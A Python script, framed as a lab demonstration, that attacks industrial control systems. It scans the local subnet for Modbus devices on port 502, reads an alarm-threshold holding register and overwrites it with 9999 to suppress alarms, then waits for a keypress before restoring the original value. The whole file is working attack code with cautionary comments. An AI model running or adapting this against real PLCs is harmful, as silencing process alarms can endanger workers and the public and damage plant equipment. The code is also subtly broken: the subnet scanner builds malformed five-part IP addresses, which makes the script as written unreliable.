# This script demonstrates the MITRE ATT&CK technique T0879: Inhibit Response Function - Modify Alarm Settings
# It assumes a basic understanding of Modbus communication and PLC programming.
#  This is a **DEMONSTRATION** and may need significant modification to work in a real-world ICS environment.
# **USE WITH EXTREME CAUTION IN A LAB ENVIRONMENT ONLY.**  Unauthorized access or modification of ICS systems can have catastrophic consequences.

import pymodbus.client as ModbusClient
from pymodbus.payload import BinaryPayloadBuilder
from pymodbus.constants import Endian
import socket
import struct

# Configuration (Modify as needed for your specific PLC and network)
PLC_IP = None  # Initially set to None.  Will be discovered.
PLC_PORT = 502  # Standard Modbus port
ALARM_REGISTER_ADDRESS = 40001 # Example register. **MUST BE VERIFIED FOR YOUR PLC**
ORIGINAL_ALARM_THRESHOLD = 100 # Example value. **MUST BE VERIFIED FOR YOUR PLC**
MODIFIED_ALARM_THRESHOLD = 9999 # Example value to inhibit alarms.  **MUST BE VERIFIED FOR YOUR PLC**
DEBUG = True  # Enable debug printing

def find_plc_ip():
    """
    Attempt to discover the PLC's IP address by scanning the local network.
    This is a very basic and unreliable approach.  More robust discovery
    methods (e.g., using specialized ICS protocol scanners) are recommended
    in real-world scenarios.

    Returns:
        str: The PLC's IP address if found, otherwise None.
    """
    try:
        # Get the host's IP address
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        # Determine the network address (e.g., 192.168.1.0)
        network_address = '.'.join(local_ip.split('.')[:-1]) + '.0'

        if DEBUG:
            print(f"Local IP: {local_ip}")
            print(f"Network Address: {network_address}")


        # Scan the network (VERY basic and slow)
        for i in range(1, 255):  # Iterate through possible host addresses
            target_ip = f"{network_address}.{i}"

            # Simple Modbus connection attempt to identify the PLC
            try:
                client = ModbusClient.ModbusTcpClient(target_ip, port=PLC_PORT, timeout=1)
                if client.connect():
                    print(f"PLC Found at: {target_ip}")
                    client.close()  # Close the connection after identifying the PLC
                    return target_ip
                else:
                    if DEBUG:
                        print(f"No PLC at {target_ip}")
            except Exception as e:
                if DEBUG:
                    print(f"Error connecting to {target_ip}: {e}")

    except Exception as e:
        print(f"Error during IP discovery: {e}")

    print("PLC IP address not found.")
    return None


def read_alarm_threshold(client, register_address):
    """Reads the current alarm threshold value from the PLC."""
    try:
        result = client.read_holding_registers(register_address, 1)  # Read one register
        if result.isError():
            print(f"Error reading register: {result}")
            return None

        value = result.registers[0]
        print(f"Current Alarm Threshold: {value}")
        return value

    except Exception as e:
        print(f"Error reading alarm threshold: {e}")
        return None

def write_alarm_threshold(client, register_address, new_threshold):
    """Writes a new alarm threshold value to the PLC."""
    try:
        builder = BinaryPayloadBuilder(byteorder=Endian.Big, wordorder=Endian.Little)
        builder.add_16bit_int(new_threshold)  # Assuming a 16-bit integer
        payload = builder.to_registers()

        result = client.write_registers(register_address, payload)
        if result.isError():
            print(f"Error writing register: {result}")
            return False

        print(f"Successfully wrote new alarm threshold: {new_threshold} to register {register_address}")
        return True

    except Exception as e:
        print(f"Error writing alarm threshold: {e}")
        return False


def main():
    global PLC_IP  # Access the global PLC_IP variable

    # Discover the PLC IP address if it's not already set
    if PLC_IP is None:
        PLC_IP = find_plc_ip()
        if PLC_IP is None:
            print("Cannot continue without PLC IP address. Exiting.")
            return


    # Establish Modbus TCP connection
    client = ModbusClient.ModbusTcpClient(PLC_IP, port=PLC_PORT)
    try:
        if client.connect():
            print(f"Connected to PLC at {PLC_IP}:{PLC_PORT}")

            # 1. Read the original alarm threshold
            original_value = read_alarm_threshold(client, ALARM_REGISTER_ADDRESS)

            if original_value is not None:
                # 2. Modify the alarm threshold to inhibit the alarm
                print(f"Attempting to modify alarm threshold to: {MODIFIED_ALARM_THRESHOLD}")
                if write_alarm_threshold(client, ALARM_REGISTER_ADDRESS, MODIFIED_ALARM_THRESHOLD):

                    # Optional: Verify the change
                    new_value = read_alarm_threshold(client, ALARM_REGISTER_ADDRESS)
                    if new_value == MODIFIED_ALARM_THRESHOLD:
                        print("Alarm threshold successfully modified.")
                    else:
                        print("Verification failed. Alarm threshold might not have been changed correctly.")

                    input("Press Enter to restore the original alarm threshold...") # Pause before restoring


                    # 3. Restore the original alarm threshold  (CRITICAL to avoid persistent disruption)
                    print(f"Restoring original alarm threshold: {original_value}")
                    if write_alarm_threshold(client, ALARM_REGISTER_ADDRESS, original_value):
                        print("Original alarm threshold restored.")
                    else:
                        print("Failed to restore original alarm threshold!")


        else:
            print("Failed to connect to PLC.")

    finally:
        client.close()
        print("Connection closed.")


if __name__ == "__main__":
    main()